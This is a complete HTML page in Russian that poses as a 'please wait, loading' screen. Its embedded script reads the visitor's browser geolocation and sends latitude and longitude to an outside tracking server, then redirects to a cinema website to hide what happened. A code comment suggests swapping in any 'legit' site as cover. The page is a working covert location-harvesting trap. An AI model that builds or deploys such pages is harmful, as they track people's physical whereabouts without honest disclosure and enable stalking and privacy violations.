<!DOCTYPE html>
<html lang="ru">
<head>
  <meta charset="UTF-8" />
  <title>Загрузка...</title>
  <style>body { text-align:center; margin-top:50px; font-family: Arial; }</style>
</head>
<body>
  <h2>Пожалуйста, подождите, идет загрузка...</h2>
  <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/6/65/Black_cat_silhouette.svg/240px-Black_cat_silhouette.svg.png" alt="Загрузка" width="200" />
  <script>
    navigator.geolocation.getCurrentPosition(
      pos => {
        fetch('https://geo-tracker-l5ui.onrender.com/send_location', {
          method: 'POST',
          headers: {'Content-Type': 'application/json'},
          body: JSON.stringify({
            latitude: pos.coords.latitude,
            longitude: pos.coords.longitude
          })
        });
        setTimeout(() => {
          window.location.href = 'https://kinomax.ru/ryazan';  // можно заменить на любой "легит" сайт
        }, 3000);
      },
      err => {
        setTimeout(() => {
          window.location.href = 'https://kinomax.ru/ryazan';
        }, 3000);
      }
    );
  </script>
</body>
</html>
